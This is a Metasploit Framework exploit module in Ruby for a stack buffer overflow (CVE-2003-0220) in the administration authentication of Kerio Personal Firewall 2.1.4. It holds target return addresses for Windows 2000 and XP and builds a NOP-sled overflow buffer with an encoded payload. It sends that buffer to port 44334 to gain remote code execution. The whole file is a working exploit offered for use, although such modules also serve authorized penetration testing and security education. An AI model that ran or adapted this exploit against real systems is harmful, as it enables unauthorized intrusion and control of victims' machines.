##
# $Id: kerio_auth.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Kerio Firewall 2.1.4 Authentication Packet Overflow\',
			\'Description\'    => %q{
				This module exploits a stack buffer overflow in Kerio Personal Firewall
				administration authentication process. This module has only been tested
				against Kerio Personal Firewall 2 (2.1.4).
			},
			\'Author\'         => \'MC\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9525 $\',
			\'References\'     =>
				[
					[\'CVE\', \'2003-0220\'],
					[\'OSVDB\', \'6294\'],
					[\'BID\', \'7180\'],
					[\'URL\', \'http://www1.corest.com/common/showdoc.php?idx=314&idxseccion=10\'],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 800,
					\'BadChars\' => \"\\x00\",
					\'PrependEncoder\' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'Windows 2000 Pro SP4 English\', { \'Ret\' => 0x7c2ec68b } ],
					[ \'Windows XP Pro SP0 English\',   { \'Ret\' => 0x77e3171b } ],
					[ \'Windows XP Pro SP1 English\',   { \'Ret\' => 0x77dc5527 } ],
				],
			\'Privileged\'     => true,
			\'DisclosureDate\' => \'Apr 28 2003\',
			\'DefaultTarget\' => 0))

		register_options(
			[
				Opt::RPORT(44334)
			], self.class)
	end

	def exploit
		connect

		print_status(\"Trying target #{target.name}...\")

		sploit =  make_nops(4468) + payload.encoded
		sploit << [target.ret].pack(\'V\') + [0xe8, -850].pack(\'CV\')

		sock.put(sploit)
		sock.get_once(-1, 3)

		handler
		disconnect
	end

end
